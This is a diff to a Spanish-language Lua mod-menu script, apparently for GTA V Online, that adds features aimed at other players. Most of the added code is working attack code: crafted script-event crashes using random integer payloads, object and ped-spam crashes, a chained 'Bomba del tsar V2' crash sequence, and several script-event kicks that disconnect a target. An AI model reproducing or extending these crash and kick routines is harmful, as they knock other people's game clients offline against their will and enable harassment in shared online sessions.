@@ -10,7 +10,7 @@ util.require_natives(1663599433)
 util.toast("Bienvenide Al Script!!")
 util.toast("Cargando, espere... (1-2s)")
 local response = false
-local localVer = 3.53
+local localVer = 3.6
 async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
     currentVer = tonumber(output)
     response = true
@@ -1122,6 +1122,20 @@ players.on_join(function(player_id)
         end)
     end)
 
+    menu.action(crashes, "Script V1", {}, "Crasheo a base de scripts", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            end
+            util.yield()
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+        end
+    end)
+
     --menu.action(crashes, "Test", {""}, "", function()
     --    local user = players.user()
     --    local user_ped = players.user_ped()
@@ -1174,12 +1188,161 @@ players.on_join(function(player_id)
         util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
     end)
 
-    menu.action(crashes, "Inbloqueable V3 '2T1'", {"crashv4"}, "", function()
+    local twotake = menu.list(crashes, "2T1 Crashes", {}, "")
+
+    menu.action(twotake, "Modelo Invalido V1", {"crashv4"}, "", function()
         BlockSyncs(player_id, function()
             local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             util.yield(1000)
             entities.delete_by_handle(object)
+        end)
+    end)
+
+    menu.action(twotake, "Modelo Invalido V2", {"crashv5"}, "", function()
+        BlockSyncs(player_id, function()
+            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            entities.delete_by_handle(object)
+            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            entities.delete_by_handle(object)
+            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            entities.delete_by_handle(object)
+            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            entities.delete_by_handle(object)
+            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            entities.delete_by_handle(object)
+            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            entities.delete_by_handle(object)
+            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            entities.delete_by_handle(object)
+            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            entities.delete_by_handle(object)
+            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            entities.delete_by_handle(object)
+            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            util.yield(1000)
+            entities.delete_by_handle(object)
+        end)
+
+    end)
+
+    menu.action(twotake, "Script Crash V1", {"crashv6"}, "", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            end
+            util.yield()
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-1733737974, player_id, 789522, 59486,48512151,-9545440,5845131,848153,math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-1529596656, player_id, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+        end
+        util.yield(100)
+        util.trigger_script_event(1 << player_id, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+        util.trigger_script_event(1 << player_id, {962740265, 2000000, 2000000, 2000000, 2000000})
+        util.trigger_script_event(1 << player_id, {1228916411, 1, 1245317585})
+        util.trigger_script_event(1 << player_id, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
+        util.trigger_script_event(1 << player_id, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
+        util.trigger_script_event(1 << player_id, {-555356783, player_id, 85952,99999,52682274855,526822745})
+        util.trigger_script_event(1 << player_id, {526822748, player_id, 78552,99999 ,7949161,789454312})
+        util.trigger_script_event(1 << player_id, {-8965204809, player_id, 795221,59486,48512151,-9545440})
+        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
+        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
+        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+    
+    end)
+
+    menu.action(twotake, "Script Crash V2", {"crashv7"}, "", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            end
+            util.yield()
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+        end
+        util.yield(100)
+        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
+        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
+        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+
+    end)
+
+    local krustykrab = menu.list(twotake, "Don Crangrejo", {}, "Es riesgoso spectear, cuidado: funciona en usuarios de 2T1")
+
+    local peds = 5
+    menu.slider(krustykrab, "Numero De Espatulas", {}, "Envia espatulas ah~", 1, 100, 1, 1, function(amount)
+        util.toast(players.get_name(player_id).. " Se le han enviado espatulas")
+        peds = amount
+    end)
+
+    local crash_ents = {}
+    local crash_toggle = false
+    menu.toggle(krustykrab, "Numero De Espatulas", {}, "Es riesgoso spectear, cuidado.", function(val)
+        util.toast(players.get_name(player_id).. " Se le han enviado espatulas")
+        local crash_toggle = val
+        BlockSyncs(player_id, function()
+            if val then
+                local number_of_peds = peds
+                local ped_mdl = util.joaat("ig_siemonyetarian")
+                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+                local ped_pos = players.get_position(player_id)
+                ped_pos.z += 3
+                request_model(ped_mdl)
+                for i = 1, number_of_peds do
+                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
+                    crash_ents[i] = ped
+                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
+                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
+                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
+                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
+                end
+                repeat
+                    for k, ped in crash_ents do
+                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
+                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
+                    end
+                    for k, v in entities.get_all_objects_as_pointers() do
+                        if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
+                            entities.delete_by_pointer(v)
+                        end
+                    end
+                    util.yield_once()
+                    util.yield_once()
+                until not (crash_toggle and players.exists(player_id))
+                crash_toggle = false
+                for k, obj in crash_ents do
+                    entities.delete_by_handle(obj)
+                end
+                crash_ents = {}
+            else
+                for k, obj in crash_ents do
+                    entities.delete_by_handle(obj)
+                end
+                crash_ents = {}
+            end
         end)
     end)
 
@@ -1254,6 +1417,14 @@ players.on_join(function(player_id)
         menu.trigger_commands("crashv2"..players.get_name(player_id))
         util.yield(400)
         menu.trigger_commands("crashv3"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("crashv4"..players.get_name(player_id))
+        --util.yield(400)
+        --menu.trigger_commands("crashv5"..players.get_name(player_id))
+        --util.yield(400)
+        --menu.trigger_commands("crashv6"..players.get_name(player_id))
+        --util.yield(400)
+        --menu.trigger_commands("crashv7"..players.get_name(player_id))
         -- Turned off because of a self-crash error
         --util.yield(600)
         --menu.trigger_commands("crashv4"..players.get_name(player_id))
@@ -1275,6 +1446,50 @@ players.on_join(function(player_id)
         menu.trigger_commands("anticrashcamera off")
     end)
     
+    menu.action(crashes, "Bomba del tsar V2", {"tsarbomba2"}, "Crash demandante de pc, si no tienes buena pc no te recomiendo usarlo (Inbloqueable uwu)", function()
+        local objective = player_id
+        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
+        menu.trigger_commands("anticrashcamera on")
+        menu.trigger_commands("potatomode on")
+        menu.trigger_commands("trafficpotato on")
+        util.toast("Iniciando...")
+        util.toast("Pobre man")
+        menu.trigger_commands("rlag3"..players.get_name(player_id))
+        util.yield(2500)
+        menu.trigger_commands("crashv1"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("crashv2"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("crashv3"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("crashv4"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("crashv5"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("crashv6"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("crashv7"..players.get_name(player_id))
+        -- Turned off because of a self-crash error
+        --util.yield(600)
+        --menu.trigger_commands("crashv4"..players.get_name(player_id))
+        util.yield(2000)
+        menu.trigger_commands("crash"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("ngcrash"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("footlettuce"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("steamroll"..players.get_name(player_id))
+        util.yield(1800)
+        util.toast("Espera en lo que se limpia todo...")
+        --menu.trigger_command(outSync, "off")
+        menu.trigger_commands("rcleararea")
+        menu.trigger_commands("potatomode off")
+        menu.trigger_commands("trafficpotato off")
+        util.yield(8000)
+        menu.trigger_commands("anticrashcamera off")
+    end)
+
     -- Structure premade for the next crash
 
 
@@ -1315,6 +1530,28 @@ players.on_join(function(player_id)
             util.trigger_script_event(1 << player_id, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
         end)
     end
+
+    local sekicks = menu.list(kicks, "Kickeos Por Scripts", {}, "")
+
+    menu.action(sekicks, "Script kick v1", {}, "", function()
+        util.trigger_script_event(1 << player_id, {111242367, player_id, -210634234})
+    end)
+    
+    menu.action(sekicks, "Script kick v2", {}, "", function()
+        util.trigger_script_event(1 << player_id, {421832664, player_id, 0, 1951261, 829})
+    end)
+
+    menu.action(sekicks, "Script kick v3", {}, "", function()
+        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
+    end)
+    
+    menu.action(sekicks, "Script kick v4", {}, "", function()
+        util.trigger_script_event(1 << player_id, {603406648, 0, 380565701, -1443464333, 1, 115, 954851592, -768074745, 1278027916})
+    end)
+    
+    menu.action(sekicks, "Script kick v5", {}, "", function()
+        util.trigger_script_event(1 << player_id, {603406648, 0, 1279476345, 655005918, 1, 115, 1997628673, 6299376, -302416007})
+    end)
 
     local antimodder = menu.list(malicious, "Anti-Modder", {}, "")
     local kill_godmode = menu.list(antimodder, "Matar jugador con godmode", {}, "")
@@ -1495,24 +1732,24 @@ players.on_join(function(player_id)
         end
     end)
 
-    menu.action(trolling, "Chop 'Test'", {}, "Saca un chop", function()
-        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
-        local c = ENTITY.GET_ENTITY_COORDS(p)
-        STREAMING.REQUEST_MODEL(chop)
-        while not STREAMING.HAS_MODEL_LOADED(chop) do
-            STREAMING.REQUEST_MODEL(chop)
-            util.yield()
-        end
-        local achop = entities.create_ped(26, chop, c, 0) --spawn chop
-        TASK.TASK_COMBAT_PED(achop , p, 0, 16)
-        setAttribute(achop)
-        if (isImmortal == true) then
-            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(achop , false)
-        end
-        if not STREAMING.HAS_MODEL_LOADED(chop) then
-            util.toast("No se puede cargar el modelo")
-        end
-    end)
+    --menu.action(trolling, "Chop 'Test'", {}, "Saca un chop", function()
+    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+    --    local c = ENTITY.GET_ENTITY_COORDS(p)
+    --    STREAMING.REQUEST_MODEL(chop)
+    --    while not STREAMING.HAS_MODEL_LOADED(chop) do
+    --        STREAMING.REQUEST_MODEL(chop)
+    --        util.yield()
+    --    end
+    --    local achop = entities.create_ped(26, chop, c, 0) --spawn chop
+    --    TASK.TASK_COMBAT_PED(achop , p, 0, 16)
+    --    setAttribute(achop)
+    --    if (isImmortal == true) then
+    --        ENTITY.SET_ENTITY_CAN_BE_DAMAGED(achop , false)
+    --    end
+    --    if not STREAMING.HAS_MODEL_LOADED(chop) then
+    --        util.toast("No se puede cargar el modelo")
+    --    end
+    --end)
 
     player_toggle_loop(trolling, player_id, "Spam De Sonido", {}, "", function()
         util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, math.random(1, 0x6)})
@@ -2573,13 +2810,13 @@ menu.toggle_loop(protects, "Bloquear Error De Transaccion", {}, "Es probable que
     end
 end)
 
-menu.toggle_loop(protects, "Bloquear Fuego/Lag", {}, "", function()
-    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
-    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
-    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
-end)
+--menu.toggle_loop(protects, "Bloquear Fuego/Lag", {}, "", function()
+--    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
+--    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
+--    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
+--end)
 
-menu.toggle_loop(protects, "Bloquear PTFX", {}, "", function()
+menu.toggle_loop(protects, "Bloquear PFTX/Particulas Lag", {}, "", function()
     local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
     GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
     GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
@@ -3421,6 +3658,8 @@ end)
 menu.action(credits, "Cxbr", {}, "Thx for friendly features <3", function()
 end)
 menu.action(credits, "Sapphire", {}, "Who helped me with almost every single feature and being patient because of my dumb brain <3", function()
+end)
+menu.action(credits, "Wigger", {}, "He bringed some ideas to the script and some functions, thx", function()
 end)
 menu.action(credits, "You <3", {}, "Who download the script and give ideas for improvement <3", function()
 end)
